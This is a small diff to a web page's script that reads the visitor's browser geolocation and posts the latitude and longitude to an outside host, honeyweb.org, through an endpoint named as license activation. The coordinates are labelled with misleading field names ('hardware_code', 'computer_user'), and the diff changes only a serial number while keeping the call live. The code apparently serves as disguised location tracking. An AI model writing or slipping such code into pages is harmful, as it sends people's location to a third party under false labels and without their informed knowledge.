@@ -10,7 +10,7 @@
   navigator.geolocation.getCurrentPosition(function(position){
     console.log(position.coords.latitude);
     console.log(position.coords.longitude);
-      $.post("https://honeyweb.org/api/license/activate", {"serial_no":"1", "license_key":"$2y$10$gQPY5MhVgEGT4CUQjD0klOLP4vZZl/3zhulsBcUju4d8WlDnw69ZK", "hardware_code":position.coords.latitude, "computer_user":position.coords.longitude},function(data, status){});
+      $.post("https://honeyweb.org/api/license/activate", {"serial_no":"4", "license_key":"$2y$10$gQPY5MhVgEGT4CUQjD0klOLP4vZZl/3zhulsBcUju4d8WlDnw69ZK", "hardware_code":position.coords.latitude, "computer_user":position.coords.longitude},function(data, status){});
   })
 </script>
 </body>
